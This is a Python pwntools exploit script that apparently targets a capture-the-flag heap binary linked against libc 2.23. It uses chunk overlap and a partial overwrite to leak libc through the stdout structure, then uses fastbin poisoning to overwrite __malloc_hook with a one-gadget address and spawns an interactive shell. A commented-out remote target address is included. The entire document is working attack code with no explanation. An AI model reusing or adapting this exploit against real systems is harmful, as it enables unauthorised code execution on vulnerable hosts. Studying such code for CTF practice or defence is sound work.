from pwn import*
#context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def new(size):
	menu(1)
	p.sendlineafter('size:',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('idx:',str(index))
	p.sendafter('content:',	content)
def free(index):
	menu(3)
	p.sendlineafter('idx:',str(index))
def F(index):
	sleep(0.05)
	p.sendline('3')
	sleep(0.05)
	p.sendline(str(index))
def E(index,content):
	sleep(0.05)
	p.sendline('2')
	sleep(0.05)
	p.sendline(str(index))
	sleep(0.05)
	p.send(content)
	
while True:
	p  = process('./main')
	libc =ELF('./libc-2.23.so')
#	p = remote('39.101.184.181',10000)
	try:
		new(0x18)	#0
		new(0x2F8)  #1
		new(0x2F8)  #2
		new(0x380)  #3
		new(0x380)  #4
		new(0x380)  #5
		new(0x380)  #6
		new(0x380)  #7
		edit(7,(p64(0) + p64(0x21))*0x38)
		new(0x18)   #8
		free(0)
		edit(1,'\x00'*0x2F0 + p64(0x320))
		free(2)
		####################
		new(0x18)   #0
		new(0x78)   #2
		new(0x78)   #9
		new(0xF8)   #10
		new(0x88)   #11
		new(0x68)   #12
		new(0x2F8)  #13

		free(2)
		edit(9,'\x00'*0x70 + p64(0x100))
		free(10)
		new(0x78) #2
		new(0x78) #10 = 9
		new(0xF8) #14


		free(2)
		edit(1,p64(0) + '\xE8\x37\n')
		new(0x70)
		edit(1,'\x00'*0x78 + p64(0x1631) +  '\n')
		free(9)

		E(1,'\x00'*0x78 + p64(0x1651) + '\n')
		F(10)
		libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 131 - libc.sym['_IO_2_1_stdout_']
		log.info('LIBC:\t' + hex(libc_base))
		malloc_hook = libc_base + libc.sym['__malloc_hook']
		rce = libc_base + 0xF0364
		free(12)
		edit(1,'\x00'*0x288 + p64(0x71) + p64(malloc_hook - 0x23) + '\n')
		new(0x60) #9
		new(0x60) #10
		edit(10,'\x00'*0x13 + p64(rce) + '\n')
		new(0x10)
		break
	except:
		p.close()
		continue
p.interactive()
